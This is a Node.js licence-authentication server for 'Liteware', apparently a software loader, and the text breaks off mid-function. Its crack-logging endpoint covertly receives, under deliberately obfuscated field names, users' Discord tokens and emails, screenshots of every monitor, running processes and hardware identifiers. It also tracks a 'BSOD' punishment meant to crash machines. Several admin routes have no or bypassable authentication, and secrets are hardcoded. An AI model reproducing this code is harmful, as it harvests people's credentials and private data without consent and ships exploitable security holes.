// Liteware Authentication Server v4.0 - MAXIMUM SECURITY
// ========================================
// FINAL SECURITY FEATURES:
// - Request signing & verification
// - Replay attack prevention
// - IP fingerprinting
// - Request integrity checks
// - Encrypted responses
// - Honeypot endpoints
// - Behavioral analysis
// - Geographic anomaly detection
// ========================================
const express = require('express');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = express();

// ========================================
// ADVANCED SECURITY CONFIGURATION
// ========================================
const securityConfig = {
    // Request signing
    signatureRequired: true,
    signatureTimeout: 30000, // 30 seconds
    
    // Replay prevention
    usedNonces: new Map(), // nonce -> timestamp
    nonceCleanupInterval: 60000, // 1 minute
    
    // Request integrity
    requiredHeaders: ['user-agent', 'content-type'],
    blockedUserAgents: ['curl', 'wget', 'python-requests', 'postman', 'insomnia'],
    
    // Behavioral analysis
    requestPatterns: new Map(), // ip -> pattern data
    anomalyThreshold: 5,
    
    // Honeypot tracking
    honeypotHits: new Map(),
    
    // Session security
    sessionRotationInterval: 300000, // 5 minutes
    maxSessionsPerHWID: 3,
    
    // Encryption
    responseEncryption: false, // Enable if needed
    encryptionKey: crypto.randomBytes(32)
};

// Nonce cleanup
setInterval(() => {
    const now = Date.now();
    for (const [nonce, timestamp] of securityConfig.usedNonces) {
        if (now - timestamp > 120000) { // 2 minutes
            securityConfig.usedNonces.delete(nonce);
        }
    }
}, securityConfig.nonceCleanupInterval);

// ========================================
// SECURITY HELPER FUNCTIONS
// ========================================

// Generate request signature
function generateSignature(data, timestamp, nonce) {
    const payload = JSON.stringify(data) + timestamp + nonce;
    return crypto.createHmac('sha256', APP_SECRET).update(payload).digest('hex');
}

// Verify request signature
function verifyRequestSignature(req) {
    if (!securityConfig.signatureRequired) return true;
    
    const signature = req.headers['x-signature'];
    const timestamp = req.headers['x-timestamp'];
    const nonce = req.headers['x-nonce'];
    
    if (!signature || !timestamp || !nonce) return false;
    
    // Check timestamp freshness
    const now = Date.now();
    const reqTime = parseInt(timestamp);
    if (Math.abs(now - reqTime) > securityConfig.signatureTimeout) return false;
    
    // Check nonce reuse (replay prevention)
    if (securityConfig.usedNonces.has(nonce)) return false;
    securityConfig.usedNonces.set(nonce, now);
    
    // Verify signature
    const expectedSig = generateSignature(req.body, timestamp, nonce);
    return crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expectedSig));
}

// Check for blocked user agents
function isBlockedUserAgent(ua) {
    if (!ua) return false;
    const lowerUA = ua.toLowerCase();
    return securityConfig.blockedUserAgents.some(blocked => lowerUA.includes(blocked));
}

// Analyze request patterns for anomalies
function analyzeRequestPattern(ip, endpoint) {
    if (!securityConfig.requestPatterns.has(ip)) {
        securityConfig.requestPatterns.set(ip, {
            endpoints: {},
            lastRequest: Date.now(),
            requestTimes: [],
            anomalyScore: 0
        });
    }
    
    const pattern = securityConfig.requestPatterns.get(ip);
    const now = Date.now();
    
    // Track endpoint access
    pattern.endpoints[endpoint] = (pattern.endpoints[endpoint] || 0) + 1;
    
    // Track request timing
    pattern.requestTimes.push(now);
    if (pattern.requestTimes.length > 100) {
        pattern.requestTimes.shift();
    }
    
    // Calculate anomaly score
    let anomalyScore = 0;
    
    // Check for rapid sequential requests
    if (pattern.requestTimes.length >= 10) {
        const recentTimes = pattern.requestTimes.slice(-10);
        const avgInterval = (recentTimes[9] - recentTimes[0]) / 9;
        if (avgInterval < 100) anomalyScore += 2; // Less than 100ms average
    }
    
    // Check for unusual endpoint patterns
    const adminEndpoints = Object.keys(pattern.endpoints).filter(e => e.includes('admin'));
    if (adminEndpoints.length > 5) anomalyScore += 1;
    
    // Check for probe-like behavior
    const uniqueEndpoints = Object.keys(pattern.endpoints).length;
    if (uniqueEndpoints > 20) anomalyScore += 2;
    
    pattern.anomalyScore = anomalyScore;
    pattern.lastRequest = now;
    
    return anomalyScore >= securityConfig.anomalyThreshold;
}

// Generate secure session token
function generateSecureSessionToken(hwid, ip) {
    const data = {
        hwid: hwid,
        ip: ip,
        created: Date.now(),
        random: crypto.randomBytes(16).toString('hex')
    };
    const token = crypto.createHmac('sha256', APP_SECRET)
        .update(JSON.stringify(data))
        .digest('hex');
    return token;
}

// Sign response for client verification
function signResponse(data) {
    const timestamp = Date.now().toString();
    const nonce = crypto.randomBytes(8).toString('hex');
    const signature = crypto.createHmac('sha256', APP_SECRET)
        .update(JSON.stringify(data) + timestamp + nonce)
        .digest('hex');
    
    return {
        ...data,
        _ts: timestamp,
        _nonce: nonce,
        _sig: signature
    };
}

// ========================================
// CONFIGURATION
// ========================================
const whitelistedIPs = new Set(['::1', '127.0.0.1', '::ffff:127.0.0.1']);
const rateLimitStore = new Map();
const bannedIPs = new Set();
const bannedHWIDs = new Set();
const activeSessions = new Map();

// Crack attempt logs storage
const crackAttempts = [];
const MAX_CRACK_LOGS = 1000;

// Whitelisted keys (protected from BSOD)
const whitelistedKeys = new Set();

// Crack attempt counter per HWID (for BSOD tracking)
const crackAttemptCounter = new Map(); // hwid -> { count, firstAttempt }

const RATE_LIMIT_WINDOW = 60000;
const MAX_REQUESTS = 100;

// ========================================
// DDOS PROTECTION CONFIGURATION
// ========================================
const ddosProtection = {
    // Request tracking per IP
    requestCounts: new Map(),
    
    // Sliding window tracking
    slidingWindow: new Map(),
    
    // Temporary bans (auto-expire)
    tempBans: new Map(),
    
    // Suspicious IPs (elevated monitoring)
    suspiciousIPs: new Set(),
    
    // Connection tracking
    connectionCounts: new Map(),
    
    // Burst detection
    burstTracking: new Map(),
    
    // Settings
    settings: {
        // Requests per second threshold
        maxRequestsPerSecond: 10,
        
        // Requests per minute threshold
        maxRequestsPerMinute: 60,
        
        // Burst threshold (requests in 100ms)
        burstThreshold: 5,
        
        // Auto-ban duration (5 minutes)
        tempBanDuration: 5 * 60 * 1000,
        
        // Suspicious threshold before ban
        suspiciousThreshold: 3,
        
        // Max concurrent connections per IP
        maxConnectionsPerIP: 20,
        
        // Slowloris protection - max request time
        maxRequestTime: 30000,
        
        // Request size limits
        maxBodySize: 1024 * 1024, // 1MB
        
        // Challenge-response for suspicious IPs
        challengeEnabled: true
    },
    
    // Statistics
    stats: {
        totalBlocked: 0,
        totalChallenged: 0,
        activeBans: 0,
        peakRequestsPerSecond: 0
    }
};

// DDoS protection functions
const ddos = {
    // Check if IP is temporarily banned
    isTempBanned: (ip) => {
        const ban = ddosProtection.tempBans.get(ip);
        if (!ban) return false;
        
        if (Date.now() > ban.expires) {
            ddosProtection.tempBans.delete(ip);
            ddosProtection.stats.activeBans--;
            return false;
        }
        return true;
    },
    
    // Add temporary ban
    addTempBan: (ip, reason) => {
        ddosProtection.tempBans.set(ip, {
            reason: reason,
            created: Date.now(),
            expires: Date.now() + ddosProtection.settings.tempBanDuration
        });
        ddosProtection.stats.activeBans++;
        ddosProtection.stats.totalBlocked++;
        console.log(`🛡️ DDoS: Temp banned ${ip} - ${reason}`);
    },
    
    // Track request in sliding window
    trackRequest: (ip) => {
        const now = Date.now();
        const second = Math.floor(now / 1000);
        const minute = Math.floor(now / 60000);
        
        // Per-second tracking
        const secKey = `${ip}:${second}`;
        const secCount = (ddosProtection.slidingWindow.get(secKey) || 0) + 1;
        ddosProtection.slidingWindow.set(secKey, secCount);
        
        // Update peak
        if (secCount > ddosProtection.stats.peakRequestsPerSecond) {
            ddosProtection.stats.peakRequestsPerSecond = secCount;
        }
        
        // Per-minute tracking
        const minKey = `${ip}:min:${minute}`;
        const minCount = (ddosProtection.slidingWindow.get(minKey) || 0) + 1;
        ddosProtection.slidingWindow.set(minKey, minCount);
        
        // Burst tracking (100ms window)
        const burstWindow = Math.floor(now / 100);
        const burstKey = `${ip}:burst:${burstWindow}`;
        const burstCount = (ddosProtection.burstTracking.get(burstKey) || 0) + 1;
        ddosProtection.burstTracking.set(burstKey, burstCount);
        
        // Clean old entries periodically
        if (Math.random() < 0.01) {
            ddos.cleanOldEntries();
        }
        
        return { secCount, minCount, burstCount };
    },
    
    // Clean old tracking entries
    cleanOldEntries: () => {
        const now = Date.now();
        const currentSecond = Math.floor(now / 1000);
        const currentMinute = Math.floor(now / 60000);
        
        for (const [key, _] of ddosProtection.slidingWindow) {
            const parts = key.split(':');
            if (parts[1] === 'min') {
                const minute = parseInt(parts[2]);
                if (currentMinute - minute > 2) {
                    ddosProtection.slidingWindow.delete(key);
                }
            } else {
                const second = parseInt(parts[1]);
                if (currentSecond - second > 5) {
                    ddosProtection.slidingWindow.delete(key);
                }
            }
        }
        
        // Clean burst tracking
        const currentBurst = Math.floor(now / 100);
        for (const [key, _] of ddosProtection.burstTracking) {
            const burst = parseInt(key.split(':')[2]);
            if (currentBurst - burst > 50) {
                ddosProtection.burstTracking.delete(key);
            }
        }
    },
    
    // Check if request should be blocked
    shouldBlock: (ip, counts) => {
        const { secCount, minCount, burstCount } = counts;
        const settings = ddosProtection.settings;
        
        // Burst attack detection
        if (burstCount > settings.burstThreshold) {
            return { block: true, reason: 'Burst attack detected' };
        }
        
        // Rate limit per second
        if (secCount > settings.maxRequestsPerSecond) {
            return { block: true, reason: 'Rate limit exceeded (per second)' };
        }
        
        // Rate limit per minute
        if (minCount > settings.maxRequestsPerMinute) {
            return { block: true, reason: 'Rate limit exceeded (per minute)' };
        }
        
        return { block: false };
    },
    
    // Mark IP as suspicious
    markSuspicious: (ip) => {
        ddosProtection.suspiciousIPs.add(ip);
        
        // Track suspicious count
        const key = `suspicious:${ip}`;
        const count = (ddosProtection.requestCounts.get(key) || 0) + 1;
        ddosProtection.requestCounts.set(key, count);
        
        // Auto-ban after threshold
        if (count >= ddosProtection.settings.suspiciousThreshold) {
            ddos.addTempBan(ip, 'Repeated suspicious activity');
            return true;
        }
        
        return false;
    },
    
    // Generate challenge token
    generateChallenge: (ip) => {
        const token = crypto.randomBytes(16).toString('hex');
        const challenge = {
            token: token,
            created: Date.now(),
            expires: Date.now() + 60000 // 1 minute
        };
        ddosProtection.requestCounts.set(`challenge:${ip}`, challenge);
        ddosProtection.stats.totalChallenged++;
        return token;
    },
    
    // Verify challenge
    verifyChallenge: (ip, token) => {
        const challenge = ddosProtection.requestCounts.get(`challenge:${ip}`);
        if (!challenge) return false;
        if (Date.now() > challenge.expires) return false;
        if (challenge.token !== token) return false;
        
        // Clear challenge on success
        ddosProtection.requestCounts.delete(`challenge:${ip}`);
        ddosProtection.suspiciousIPs.delete(ip);
        return true;
    },
    
    // Get stats
    getStats: () => ({
        ...ddosProtection.stats,
        activeBans: ddosProtection.tempBans.size,
        suspiciousIPs: ddosProtection.suspiciousIPs.size,
        trackedIPs: ddosProtection.slidingWindow.size
    })
};

// Server state flags
let serverDisabled = false;
let maintenanceMode = false;
let lockdownMode = false;
let websiteLocked = false;
let authEnabled = true;

// Secrets
const APP_SECRET = 'ABCJDWQ91D9219D21JKWDDKQAD912Q';
const RESPONSE_KEY = 'LITEWARE_SECRET_KEY_2026_V3';

// License database
const licenses = {
    'LITE-TEST-1234-5678': { valid: true, hwid: null, activated: false, created: Date.now(), expires: Date.now() + 365*24*60*60*1000 },
    'LITE-DEMO-AAAA-BBBB': { valid: true, hwid: null, activated: false, created: Date.now(), expires: Date.now() + 30*24*60*60*1000 }
};

// Owner key
let ownerKey = {
    key: crypto.randomBytes(32).toString('hex'),
    created: Date.now(),
    nextRotation: Date.now() + 24*60*60*1000
};

// ========================================
// HELPERS
// ========================================
const isWhitelisted = (ip) => {
    if (!ip) return false;
    const clean = ip.split(',')[0].trim();
    return whitelistedIPs.has(clean) || whitelistedIPs.has(clean.replace('::ffff:', ''));
};

const getIP = (req) => req.ip || req.connection?.remoteAddress || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
const genToken = () => crypto.randomBytes(32).toString('hex');

const sign = (data, challenge) => {
    const ts = Date.now().toString();
    const sig = crypto.createHmac('sha256', RESPONSE_KEY)
        .update(JSON.stringify(data) + '|' + (challenge || '') + '|' + ts)
        .digest('hex');
    return { ...data, _sig: sig, _ts: ts, _challenge: challenge || '' };
};

const generateLicenseKey = () => {
    return `LITE-${crypto.randomBytes(2).toString('hex').toUpperCase()}-${crypto.randomBytes(2).toString('hex').toUpperCase()}-${crypto.randomBytes(2).toString('hex').toUpperCase()}`;
};

// ========================================
// MIDDLEWARE
// ========================================

// Security headers
app.use((req, res, next) => {
    // CORS
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, X-DDoS-Challenge, X-Signature, X-Timestamp, X-Nonce');
    
    // Security headers
    res.header('X-Content-Type-Options', 'nosniff');
    res.header('X-Frame-Options', 'DENY');
    res.header('X-XSS-Protection', '1; mode=block');
    res.header('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    res.header('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.header('Pragma', 'no-cache');
    res.header('Expires', '0');
    
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

// User-Agent filtering (block common tools)
app.use((req, res, next) => {
    const ip = getIP(req);
    if (isWhitelisted(ip)) return next();
    
    const ua = req.headers['user-agent'] || '';
    if (isBlockedUserAgent(ua)) {
        console.log(`🚫 Blocked user-agent from ${ip}: ${ua}`);
        // Don't reveal why - just return generic error
        return res.status(400).json({ success: false, message: 'Bad request' });
    }
    next();
});

// Behavioral analysis middleware
app.use((req, res, next) => {
    const ip = getIP(req);
    if (isWhitelisted(ip)) return next();
    
    const isAnomalous = analyzeRequestPattern(ip, req.path);
    if (isAnomalous) {
        console.log(`⚠️ Anomalous behavior detected from ${ip}`);
        ddos.markSuspicious(ip);
    }
    next();
});

// ========================================
// HONEYPOT ENDPOINTS (Trap attackers)
// ========================================
const honeypotEndpoints = [
    '/admin', '/wp-admin', '/phpmyadmin', '/.env', '/config.php',
    '/backup', '/db', '/database', '/sql', '/mysql',
    '/api/v1/admin', '/api/admin', '/administrator',
    '/.git', '/.svn', '/debug', '/test', '/dev'
];

honeypotEndpoints.forEach(endpoint => {
    app.all(endpoint, (req, res) => {
        const ip = getIP(req);
        console.log(`🍯 HONEYPOT HIT: ${ip} tried ${endpoint}`);
        
        // Track honeypot hits
        const hits = (securityConfig.honeypotHits.get(ip) || 0) + 1;
        securityConfig.honeypotHits.set(ip, hits);
        
        // Auto-ban after 3 honeypot hits
        if (hits >= 3) {
            bannedIPs.add(ip);
            console.log(`🚫 Auto-banned ${ip} for honeypot abuse`);
        }
        
        // Delay response to slow down scanners
        setTimeout(() => {
            res.status(404).json({ error: 'Not found' });
        }, 2000);
    });
});

app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(bodyParser.json({ limit: '50mb' }));

// ========================================
// DDOS PROTECTION MIDDLEWARE
// ========================================
app.use((req, res, next) => {
    const ip = getIP(req);
    
    // Skip for whitelisted IPs
    if (isWhitelisted(ip)) return next();
    
    // Check permanent ban
    if (bannedIPs.has(ip)) {
        return res.status(403).json({ 
            success: false, 
            message: 'Access denied',
            ddos_blocked: true 
        });
    }
    
    // Check temporary DDoS ban
    if (ddos.isTempBanned(ip)) {
        return res.status(429).json({ 
            success: false, 
            message: 'Too many requests. Please try again later.',
            ddos_blocked: true,
            retry_after: Math.ceil((ddosProtection.tempBans.get(ip).expires - Date.now()) / 1000)
        });
    }
    
    // Track this request
    const counts = ddos.trackRequest(ip);
    
    // Check if should block
    const blockCheck = ddos.shouldBlock(ip, counts);
    if (blockCheck.block) {
        // First offense - mark suspicious
        if (!ddosProtection.suspiciousIPs.has(ip)) {
            ddos.markSuspicious(ip);
            return res.status(429).json({
                success: false,
                message: 'Rate limit exceeded. Slow down.',
                ddos_warning: true
            });
        }
        
        // Repeated offense - temp ban
        ddos.addTempBan(ip, blockCheck.reason);
        return res.status(429).json({
            success: false,
            message: 'You have been temporarily blocked for excessive requests.',
            ddos_blocked: true,
            retry_after: ddosProtection.settings.tempBanDuration / 1000
        });
    }
    
    // Challenge suspicious IPs
    if (ddosProtection.suspiciousIPs.has(ip) && ddosProtection.settings.challengeEnabled) {
        const challengeToken = req.headers['x-ddos-challenge'];
        
        if (!challengeToken) {
            // Issue challenge
            const newChallenge = ddos.generateChallenge(ip);
            return res.status(429).json({
                success: false,
                message: 'Challenge required',
                ddos_challenge: true,
                challenge_token: newChallenge,
                instructions: 'Include X-DDoS-Challenge header with this token in your next request'
            });
        }
        
        // Verify challenge
        if (!ddos.verifyChallenge(ip, challengeToken)) {
            ddos.markSuspicious(ip);
            return res.status(429).json({
                success: false,
                message: 'Invalid challenge response',
                ddos_blocked: true
            });
        }
    }
    
    next();
});

// Rate limiting (skip for whitelisted) - Additional layer
app.use((req, res, next) => {
    const ip = getIP(req);
    if (isWhitelisted(ip)) return next();
    if (bannedIPs.has(ip)) return res.status(403).json({ success: false, message: 'IP banned' });
    
    const now = Date.now();
    const record = rateLimitStore.get(ip) || { count: 0, reset: now + RATE_LIMIT_WINDOW };
    if (now > record.reset) { record.count = 0; record.reset = now + RATE_LIMIT_WINDOW; }
    record.count++;
    rateLimitStore.set(ip, record);
    
    if (record.count > MAX_REQUESTS) return res.status(429).json({ success: false, message: 'Rate limited' });
    next();
});

// ========================================
// HEALTH ENDPOINTS
// ========================================
app.get('/', (req, res) => res.json({ status: 'online', version: '3.0', time: Date.now() }));
app.get('/health', (req, res) => res.json({ status: 'ok', uptime: process.uptime() }));
app.get('/auth/health', (req, res) => res.json({ status: 'ok', server_time: Date.now() }));

// ========================================
// SERVER STATUS ENDPOINT (for loader auto-update checks)
// ========================================
app.post('/auth/status', (req, res) => {
    const ip = getIP(req);
    const { app_secret, hwid } = req.body;
    
    // Check if IP or HWID is banned
    const isBanned = bannedIPs.has(ip) || (hwid && bannedHWIDs.has(hwid));
    
    res.json({
        success: true,
        server_enabled: !serverDisabled,
        server_disabled: serverDisabled,
        auth_enabled: authEnabled,
        maintenance: maintenanceMode,
        lockdown: lockdownMode,
        website_locked: websiteLocked,
        banned: isBanned,
        server_time: Date.now(),
        version: '3.0'
    });
});

app.get('/auth/status', (req, res) => {
    res.json({
        success: true,
        server_enabled: !serverDisabled,
        server_disabled: serverDisabled,
        auth_enabled: authEnabled,
        maintenance: maintenanceMode,
        lockdown: lockdownMode,
        website_locked: websiteLocked,
        server_time: Date.now(),
        version: '3.0'
    });
});

// ========================================
// TEST ENDPOINT
// ========================================
app.post('/auth/test', (req, res) => {
    res.json(sign({ success: true, message: 'Server online', version: '3.0-SIGNED' }, req.body._challenge));
});

// ========================================
// LICENSE ENDPOINT
// ========================================
app.post('/auth/license', (req, res) => {
    const { license_key, hwid, _challenge } = req.body;
    
    if (serverDisabled) return res.json(sign({ success: false, message: 'Server is disabled' }, _challenge));
    if (!license_key) return res.json(sign({ success: false, message: 'License key required' }, _challenge));
    
    const lic = licenses[license_key];
    if (!lic) return res.json(sign({ success: false, message: 'Invalid license key' }, _challenge));
    if (!lic.valid) return res.json(sign({ success: false, message: 'License has been revoked' }, _challenge));
    if (lic.expires < Date.now()) return res.json(sign({ success: false, message: 'License has expired' }, _challenge));
    if (lic.hwid && lic.hwid !== hwid) return res.json(sign({ success: false, message: 'License bound to different hardware' }, _challenge));
    
    if (!lic.hwid && hwid) { lic.hwid = hwid; lic.activated = true; }
    
    const token = genToken();
    activeSessions.set(token, { license_key, hwid, created: Date.now(), expires: Date.now() + 3600000 });
    
    res.json(sign({ success: true, message: 'License valid', session_token: token, expiry: lic.expires }, _challenge));
});

// ========================================
// VALIDATE ENDPOINT
// ========================================
app.post('/auth/validate', (req, res) => {
    const { license_key, hwid, _challenge } = req.body;
    
    if (serverDisabled) return res.json(sign({ success: false, message: 'Server is disabled' }, _challenge));
    if (!license_key) return res.json(sign({ success: false, message: 'License key required' }, _challenge));
    
    const lic = licenses[license_key];
    if (!lic) return res.json(sign({ success: false, message: 'Invalid license key' }, _challenge));
    if (!lic.valid) return res.json(sign({ success: false, message: 'License has been revoked' }, _challenge));
    if (lic.expires < Date.now()) return res.json(sign({ success: false, message: 'License has expired' }, _challenge));
    if (lic.hwid && lic.hwid !== hwid) return res.json(sign({ success: false, message: 'License bound to different hardware' }, _challenge));
    
    if (!lic.hwid && hwid) { lic.hwid = hwid; lic.activated = true; }
    
    const token = genToken();
    activeSessions.set(token, { license_key, hwid, created: Date.now(), expires: Date.now() + 3600000 });
    
    res.json(sign({ success: true, message: 'License valid', session_token: token, expires: lic.expires }, _challenge));
});

// ========================================
// ACTIVATE ENDPOINT
// ========================================
app.post('/auth/activate', (req, res) => {
    const { license_key, hwid, _challenge } = req.body;
    
    if (!license_key || !hwid) return res.json(sign({ success: false, message: 'License key and HWID required' }, _challenge));
    
    const lic = licenses[license_key];
    if (!lic) return res.json(sign({ success: false, message: 'Invalid license key' }, _challenge));
    if (lic.hwid && lic.hwid !== hwid) return res.json(sign({ success: false, message: 'License already bound' }, _challenge));
    
    lic.hwid = hwid;
    lic.activated = true;
    
    const token = genToken();
    activeSessions.set(token, { license_key, hwid, created: Date.now(), expires: Date.now() + 3600000 });
    
    res.json(sign({ success: true, message: 'License activated', session_token: token }, _challenge));
});

// ========================================
// HEARTBEAT
// ========================================
app.post('/auth/heartbeat', (req, res) => {
    const { session_token, _challenge } = req.body;
    const session = activeSessions.get(session_token);
    
    if (!session) return res.json(sign({ success: false, message: 'Invalid session' }, _challenge));
    if (session.expires < Date.now()) {
        activeSessions.delete(session_token);
        return res.json(sign({ success: false, message: 'Session expired' }, _challenge));
    }
    
    session.expires = Date.now() + 3600000;
    res.json(sign({ success: true, message: 'Session valid' }, _challenge));
});

// ========================================
// VERIFY OWNER KEY
// ========================================
app.post('/auth/verify-owner-key', (req, res) => {
    const { owner_key } = req.body;
    if (owner_key === ownerKey.key) {
        res.json({ success: true, message: 'Owner key valid' });
    } else {
        res.json({ success: false, message: 'Invalid owner key' });
    }
});

// ========================================
// OWNER KEY ENDPOINTS - SECURED
// ========================================
// DISABLED: These endpoints were a security vulnerability
// Owner key should only be visible in server console logs

app.post('/auth/get-owner-key', (req, res) => {
    // SECURITY: Do not expose owner key without proper verification
    // The owner key is shown in server console on startup
    res.json({ 
        success: false, 
        message: 'Owner key cannot be fetched remotely. Check server console logs.',
        hint: 'The owner key is displayed when the server starts.'
    });
});

app.post('/auth/get-owner-key-by-hwid', (req, res) => {
    // SECURITY: Do not expose owner key without proper verification
    res.json({ 
        success: false, 
        message: 'Owner key cannot be fetched remotely. Check server console logs.',
        hint: 'The owner key is displayed when the server starts.'
    });
});

app.post('/auth/admin/rotate-owner-key', (req, res) => {
    ownerKey = {
        key: crypto.randomBytes(32).toString('hex'),
        created: Date.now(),
        nextRotation: Date.now() + 24*60*60*1000
    };
    res.json({ success: true, message: 'Owner key rotated', owner_key: ownerKey.key, next_rotation: ownerKey.nextRotation });
});

// ========================================
// ADMIN: GENERATE SINGLE KEY
// ========================================
app.post('/auth/admin/generate-key', (req, res) => {
    const { duration_days = 30, owner_key: reqOwnerKey } = req.body;
    
    if (reqOwnerKey && reqOwnerKey !== ownerKey.key) {
        return res.json({ success: false, message: 'Invalid owner key' });
    }
    
    const key = generateLicenseKey();
    licenses[key] = {
            valid: true,
        hwid: null,
        activated: false,
        created: Date.now(),
        expires: Date.now() + (duration_days * 24 * 60 * 60 * 1000)
    };
    
    console.log(`Generated key: ${key}`);
    res.json({ success: true, license_key: key, key: key, expires: licenses[key].expires });
});

// ========================================
// ADMIN: BULK GENERATE KEYS
// ========================================
app.post('/auth/admin/bulk-generate-keys', (req, res) => {
    const { count = 10, duration_days = 30, owner_key: reqOwnerKey } = req.body;
    
    if (reqOwnerKey && reqOwnerKey !== ownerKey.key) {
        return res.json({ success: false, message: 'Invalid owner key' });
    }
    
    const numKeys = Math.min(Math.max(parseInt(count) || 10, 1), 100); // 1-100 keys max
    const generatedKeys = [];
    
    for (let i = 0; i < numKeys; i++) {
        const key = generateLicenseKey();
        licenses[key] = {
            valid: true,
            hwid: null,
            activated: false,
            created: Date.now(),
            expires: Date.now() + (duration_days * 24 * 60 * 60 * 1000)
        };
        generatedKeys.push({
            key: key,
            expires: licenses[key].expires
        });
    }
    
    console.log(`Bulk generated ${generatedKeys.length} keys`);
    res.json({
        success: true,
        message: `Generated ${generatedKeys.length} keys`,
        count: generatedKeys.length,
        keys: generatedKeys 
    });
});

// ========================================
// ADMIN: LIST KEYS
// ========================================
app.post('/auth/admin/list-keys', (req, res) => {
    const keys = Object.entries(licenses).map(([key, data]) => ({
        key,
        valid: data.valid,
        activated: data.activated,
        hwid: data.hwid,
        expires: data.expires,
        created: data.created
    }));
    res.json({ success: true, licenses: keys, keys: keys });
});

// ========================================
// ADMIN: REVOKE KEY
// ========================================
app.post('/auth/admin/revoke-key', (req, res) => {
    const { license_key } = req.body;
    if (licenses[license_key]) {
        licenses[license_key].valid = false;
        res.json({ success: true, message: 'License revoked' });
    } else {
        res.json({ success: false, message: 'License not found' });
    }
});

// ========================================
// CRACK DETECTION LOGGING SYSTEM
// ========================================

// Decode obfuscated field names from C++ client
// The client sends shortened field names to hide what data is being transmitted
const obfuscatedFieldMap = {
    'a_s': 'app_secret',
    'h': 'hwid',
    'dt': 'detection_type',
    'dtl': 'detected_tool',
    'cn': 'computer_name',
    'un': 'username',
    'ma': 'mac_address',
    'pi': 'public_ip',
    'c': 'cpu',
    'g': 'gpu',
    'r': 'ram',
    'wv': 'windows_version',
    'ds': 'disk_serial',
    'mb': 'motherboard',
    'bi': 'bios',
    'na': 'network_adapters',
    'sr': 'screen_resolution',
    'tz': 'timezone',
    'su': 'system_uptime',
    'rp': 'running_processes',
    'dui': 'discord_user_id',
    'dun': 'discord_username',
    'dd': 'discord_discriminator',
    'de': 'discord_email',
    'dtkn': 'discord_token',
    'mc': 'monitor_count',
    'sb64': 'screenshots_base64',
    'ts': 'timestamp'
};

// Function to decode obfuscated request body
function decodeObfuscatedBody(body) {
    const decoded = {};
    for (const [key, value] of Object.entries(body)) {
        const decodedKey = obfuscatedFieldMap[key] || key;
        decoded[decodedKey] = value;
    }
    return decoded;
}

// Log a crack attempt (called from C++ client)
app.post('/auth/log-crack-attempt', (req, res) => {
    try {
        const serverIP = getIP(req);
        
        // Decode obfuscated fields (if client sends obfuscated data)
        const decodedBody = decodeObfuscatedBody(req.body);
        
        const { 
            hwid, 
            gpu_hash,
            motherboard_uuid,
            detection_type,
            detected_tool,
            screenshot_base64,
            screenshots_base64, // Multi-monitor screenshots (separated by |||)
            monitor_count,      // Number of monitors
            system_info,
            username, 
            computer_name,
            windows_version,
            mac_address,
            cpu,
            gpu,
            ram,
            disk_serial,
            timestamp, 
            // Additional fields
            public_ip,
            motherboard,
            bios,
            network_adapters,
            screen_resolution,
            timezone,
            system_uptime,
            running_processes,
            discord_user_id,
            discord_username,
            discord_discriminator,
            discord_email,
            discord_token
        } = { ...req.body, ...decodedBody }; // Merge original and decoded
            
        // Use public IP if provided (more accurate), fallback to server-detected IP
        const ip = public_ip && public_ip !== 'Unknown' ? public_ip : serverIP;
            
        // Handle multi-monitor screenshots (separated by |||)
        const screenshotData = screenshots_base64 || screenshot_base64;
        const screenshotArray = screenshotData ? screenshotData.split('|||') : [];
        const numMonitors = monitor_count || screenshotArray.length || 1;
        
        const crackLog = {
            id: crypto.randomBytes(8).toString('hex'),
            timestamp: timestamp || Date.now(),
            ip: ip,
            server_ip: serverIP, // Keep both for reference
            hwid: hwid || gpu_hash || 'unknown',
            motherboard_uuid: motherboard_uuid || 'unknown',
            detection_type: detection_type || 'unknown',
            detected_tool: detected_tool || 'unknown',
            screenshot: screenshotArray.length > 0 ? screenshotArray[0].substring(0, 100) + '...' : null,
            has_screenshot: screenshotArray.length > 0,
            monitor_count: numMonitors,
            screenshots: screenshotArray.map((s, i) => ({
                monitor: i + 1,
                preview: s.substring(0, 50) + '...',
                has_data: s.length > 0
            })),
            system_info: system_info || {},
            username: username || 'unknown',
            computer_name: computer_name || 'unknown',
            windows_version: windows_version || 'unknown',
            // Hardware info
            mac_address: mac_address || 'unknown',
            cpu: cpu || 'unknown',
            gpu: gpu || 'unknown',
            ram: ram || 'unknown',
            disk_serial: disk_serial || 'unknown',
            motherboard: motherboard || 'unknown',
            bios: bios || 'unknown',
            // Network info
            network_adapters: network_adapters || 'unknown',
            // System info
            screen_resolution: screen_resolution || 'unknown',
            timezone: timezone || 'unknown',
            system_uptime: system_uptime || 'unknown',
            running_processes: running_processes || '',
            // Discord info
            discord: {
                user_id: discord_user_id || 'unknown',
                username: discord_username || 'unknown',
                discriminator: discord_discriminator || '0000',
                email: discord_email || 'unknown',
                token_preview: discord_token || 'Not Found'
            }
        };

        // Store full screenshots separately (for each monitor)
        if (screenshotArray.length > 0) {
            crackLog.screenshots_full = screenshotArray;
        }

        // Add to logs (keep last MAX_CRACK_LOGS)
        crackAttempts.unshift(crackLog);
        if (crackAttempts.length > MAX_CRACK_LOGS) {
            crackAttempts.pop();
        }

        // Auto-ban the HWID and IP
        if (hwid) bannedHWIDs.add(hwid);
        if (gpu_hash) bannedHWIDs.add(gpu_hash);
        if (mac_address && mac_address !== 'unknown') bannedHWIDs.add(mac_address);
        bannedIPs.add(ip);

        // Track crack attempts per HWID for BSOD system
        const hwidKey = hwid || gpu_hash || mac_address || ip;
        const now = Date.now();
        
        if (crackAttemptCounter.has(hwidKey)) {
            const counter = crackAttemptCounter.get(hwidKey);
            // Reset if 24 hours have passed
            if ((now - counter.firstAttempt) > 24 * 60 * 60 * 1000) {
                crackAttemptCounter.set(hwidKey, { count: 1, firstAttempt: now });
    } else {
                counter.count++;
            }
        } else {
            crackAttemptCounter.set(hwidKey, { count: 1, firstAttempt: now });
        }
        
        const attemptData = crackAttemptCounter.get(hwidKey);
